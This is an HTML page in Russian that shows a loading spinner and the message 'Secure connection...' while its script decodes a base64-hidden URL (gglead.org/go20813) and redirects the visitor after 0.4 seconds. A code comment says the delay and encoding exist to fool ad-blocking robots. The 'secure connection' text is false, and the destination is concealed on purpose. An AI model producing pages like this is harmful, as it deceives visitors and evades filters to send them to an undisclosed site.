<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #ffffff;
            text-align: center;
        }
        .loader {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #ff7300;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h2 style="font-weight: 600; margin-bottom: 8px;">Безопасное соединение...</h2>
        <p style="opacity: 0.7; font-size: 14px; margin: 0;">Подождите, выполняем автоматический переход</p>
    </div>

    <script>
        // Зашифрованная ссылка gglead.org/go20858
        const encodedUrl = "aHR0cHM6Ly9nZ2xlYWQub3JnL2dvMjA4MTM=";
        
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                try {
                    const decodedUrl = atob(encodedUrl); // Расшифровка прямо в браузере
                    window.location.replace(decodedUrl); // Мгновенный автопереход без циклов
                } catch(e) {
                    console.error(e);
                }
            }, 400); // Небольшая задержка в 0.4 сек для имитации загрузки и обхода роботов AdBlock
        });
    </script>
</body>
</html>
